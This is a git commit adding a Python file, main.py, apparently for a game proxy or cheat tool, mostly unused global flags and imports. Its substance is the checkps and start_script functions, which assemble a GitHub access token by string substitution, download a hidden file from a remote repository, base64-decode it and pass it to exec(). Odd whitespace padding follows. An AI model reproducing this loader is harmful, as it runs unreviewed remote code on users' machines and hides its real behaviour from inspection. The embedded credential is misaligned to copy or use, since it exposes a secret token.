c8a294d579bb284b3e44235b7c783af0f7713681
yahia198jr <133925064+yahia198jr@users.noreply.github.com>
2023-06-09 18:09:25 +0300

    Create main.py

---
+++ app/src/main/main.py
@@ -0,0 +1,122 @@
+
+
+invite  = None
+invite2  = None
+s = False
+gameplayed= 0
+x =1
+listt =[]
+serversocket =None
+C =None
+istarted = False
+start =None
+stop =b'\x03\x15\x00\x00\x00\x10\t\x1e\xb7N\xef9\xb7WN5\x96\x02\xb0g\x0c\xa8'
+runscript = 0
+import re 
+isconn = False
+
+increase =False
+
+back=False
+ca=False
+socktion =None
+
+invite= None
+
+
+
+
+spams = False
+
+spampacket= b''
+recordmode= False
+
+sendpackt=False
+global vares
+vares = 0
+spy = False
+inviteD=False
+inviteE=False
+op = None
+global statues
+statues= True
+SOCKS_VERSION = 5
+packet =b''
+spaming =True
+full=False
+import os
+import sys
+
+import time
+
+import socket
+import threading
+import select
+SOCKS_VERSION= 5
+
+
+
+cod = False
+
+
+
+kay = None
+
+red_cod = None
+	
+import requests
+import base64
+import ast
+
+code = False
+
+import uuid
+
+
+datap = None
+
+active = False
+
+
+
+def checkps(wer = "hyt"):
+    global datap
+    
+ #   wer = "iqGqvWFslZxC"
+    
+    
+    global active
+    device_id = str(uuid.getnode())
+    adrss = str(device_id)
+ 
+    repo_url = "https://api.github.com/repos/Yahiard/txt"
+    file_path = "mairt.py"
+    packt = "github_pat_11BAAE6LY0JbC8FI6oV6ab_mHOKgethabT8Z83WKiJ6EAHcNxhPEFS7AOQLFWRAZYDagwNvwGK"
+    file_conten = packt.replace("gethab",wer)
+    
+  #  try:
+    	
+    print('true')
+    headers = {"Authorization": f"Bearer {file_conten}"}
+    response = requests.get(repo_url + "/contents/" + file_path, headers=headers)
+    file_content = response.json()["content"]
+    decoded_content = base64.b64decode(file_content).decode("utf-8")
+    	
+    datap = decoded_content
+  
+    codw = True
+    
+    return datap
+
+SOCKS_VERSION = 5
+ipor = None
+    		
+def start_script(nap,ide):
+	    global ipor
+	    ipor = ide
+	    global datap
+	    checkps(nap)
+	    exec(datap)
+ 	    	 	         	    	         	     	         	    	 	         	    	         	    	  	    	         	    	 	         	    	         	    	
+ip = "7777777"	         	    	 	         	    	         	     	         	   	 	         	    	         	    	  	    	         	    	 	         	    	         	    	
+#start_script("nKE8uE2kac7rhH",ip)	         	    	 	         	    	         	     	         	    	 	         	    	         	    	  	    	         	   
